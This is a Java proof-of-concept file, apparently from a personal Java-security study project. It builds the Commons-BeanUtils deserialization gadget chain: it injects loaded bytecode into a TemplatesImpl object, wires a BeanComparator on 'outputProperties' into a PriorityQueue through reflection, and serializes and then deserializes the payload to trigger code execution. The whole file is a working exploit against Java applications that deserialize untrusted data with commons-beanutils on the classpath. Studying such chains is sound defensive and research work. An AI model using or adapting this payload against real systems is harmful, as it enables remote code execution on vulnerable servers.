import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import javax.xml.soap.Node;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class EXPTest {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("/home/web/Desktop/Java-Sec/Deserialization/CBChain/target/classes/TemplatesBytes.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "gnome-calculator");
        setFieldValue(templates, "_bytecodes", new byte[][] {code});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

//        templates.newTransformer();
//        templates.getOutputProperties();
//        PropertyUtils.getProperty(templates,"outputProperties");
//        BeanComparator<Object> beanComparator = new BeanComparator<>("outputProperties");
//        PriorityQueue<Object> queue = new PriorityQueue<>(beanComparator);
//        queue.add(1);
//        queue.add(templates);

        // reflect to set BeanComparator property
        BeanComparator<Object> beanComparator = new BeanComparator<>();
        PriorityQueue<Object> queue = new PriorityQueue<>(beanComparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(beanComparator,"property","outputProperties");
        setFieldValue(queue,"queue",new Object[]{templates,templates});
        serialize(queue);
        unserialize("ser.bin");

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
